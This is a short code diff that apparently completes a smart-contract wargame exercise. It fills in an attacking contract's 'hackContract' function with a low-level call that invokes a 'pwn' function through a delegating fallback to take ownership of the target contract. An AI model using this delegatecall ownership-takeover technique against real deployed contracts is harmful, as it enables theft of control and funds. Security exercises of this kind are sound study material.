@@ -10,6 +10,8 @@ contract AttackingDelegation {
     }
 
     function hackContract() external {
-        // Code me!
+        contractAddress.call(
+            abi.encodeWithSelector(Delegate.pwn.selector, msg.sender)
+        );
     }
 }
